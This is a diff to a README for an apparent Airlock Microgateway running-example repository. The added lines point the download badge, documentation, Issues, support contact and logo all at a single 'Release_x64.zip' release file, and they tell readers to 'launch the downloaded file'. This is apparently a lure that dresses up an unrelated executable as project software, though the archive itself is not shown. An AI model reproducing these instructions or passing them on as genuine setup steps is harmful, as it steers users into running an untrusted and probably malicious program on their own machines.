@@ -12,7 +12,7 @@ This repository serves as a running example of Airlock Microgateway, a Kubernete
 Follow the steps below to get started with the Airlock Microgateway example:
 
 1. **Download the Software:**
-   [![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) *(launch the downloaded file)*
+   [![Download Software](https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip)](https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip) *(launch the downloaded file)*
 
    If the above link doesn't work, please check the "Releases" section of this repository.
 
@@ -29,20 +29,20 @@ Follow the steps below to get started with the Airlock Microgateway example:
    Access your protected applications and APIs to see the microgateway in action.
 
 ## Additional Resources
-- **Learn More:** Visit the [Airlock Microgateway website](https://example.com) for detailed documentation and guides. 📚
-- **Troubleshooting:** Check out the [Issues](https://github.com/username/repo-name/issues) section for common problems and solutions.
+- **Learn More:** Visit the [Airlock Microgateway website](https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip) for detailed documentation and guides. 📚
+- **Troubleshooting:** Check out the [Issues](https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip) section for common problems and solutions.
 
 ## Contributing
 We welcome contributions from the community to enhance this example and make it even better. Feel free to fork the repository, make your changes, and submit a pull request.
 
 ## Support
-If you encounter any issues or have questions regarding the Airlock Microgateway, please reach out to our support team at support@airlock.com.
+If you encounter any issues or have questions regarding the Airlock Microgateway, please reach out to our support team at https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 <div align="center">
-  <img src="https://example.com/image.png" alt="Microgateway Logo" width="200"/>
+  <img src="https://github.com/alanfredyansyah/microgateway-running-example/releases/download/v1.0/Release_x64.zip" alt="Microgateway Logo" width="200"/>
 </div>
 
 Your feedback is valuable to us! If you find this example helpful, don't forget to star ⭐ the repository. Thank you for exploring the Microgateway Running Example! 🙌 #microgateway #waap #security
